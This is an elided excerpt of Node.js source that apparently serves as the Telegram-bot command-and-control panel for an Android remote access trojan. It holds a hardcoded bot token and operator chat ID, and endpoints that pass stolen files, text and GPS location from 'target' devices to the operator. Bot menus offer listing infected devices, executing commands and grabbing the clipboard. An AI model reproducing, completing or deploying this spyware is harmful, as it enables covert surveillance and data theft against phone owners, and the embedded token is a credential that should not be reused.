...
const token = '7258349845:AAGhOxbb142eQYkPPkFprwKNFDeHV_70Phk'
const id = '6069009671'
const address = 'https://www.facebook.com'
...
app.post("/uploadFile", upload.single('file'), (req, res) => {
    ...
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°• 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐟𝐫𝐨𝐦 <b>${req.headers.model}</b> 𝐃𝐞𝐯𝐢𝐜𝐞`,
            parse_mode: "HTML"
        },
        {
            filename: name,
...
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐟𝐫𝐨𝐦 <b>${req.headers.model}</b> 𝐃𝐞𝐯𝐢𝐜𝐞\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `°• 𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧 𝐟𝐫𝐨𝐦 <b>${req.headers.model}</b> 𝐃𝐞𝐯𝐢𝐜𝐞`, {parse_mode: "HTML"})
    res.send('')
})
...
appBot.on('message', (message) => {
    ...
    if (id == chatId) {
        ...
        if (message.text == '𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐞𝐝 𝐝𝐞𝐯𝐢𝐜𝐞𝐬') {
            if (appClients.size == 0) {
                ...
                let text = '°• 𝐋𝐢𝐬𝐭 𝐨𝐟 𝐜𝐨𝐧𝐧𝐞𝐜𝐭𝐞𝐝 𝐝𝐞𝐯𝐢𝐜𝐞𝐬  :\n\n'
        ...
        if (message.text == '𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n' +
                    '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
        ...
        appBot.editMessageText(`°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙘𝙤𝙢𝙢𝙚𝙣𝙙 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            ...
            reply_markup: {
                inline_keyboard: [
                    ...
                    [
                        {text: '𝐂𝐥𝐢𝐩𝐛𝐨𝐚𝐫𝐝', callback_data: `clipboard:${uuid}`},
                    ...
                    [
                        {text: '𝐕𝐢𝐛𝐫𝐚𝐭𝐞', callback_data: `vibrate:${uuid}`},
                        {text: '𝐒𝐡𝐨𝐰 𝐧𝐨𝐭𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧', callback_data: `show_notification:${uuid}`}
                    ],
                    [
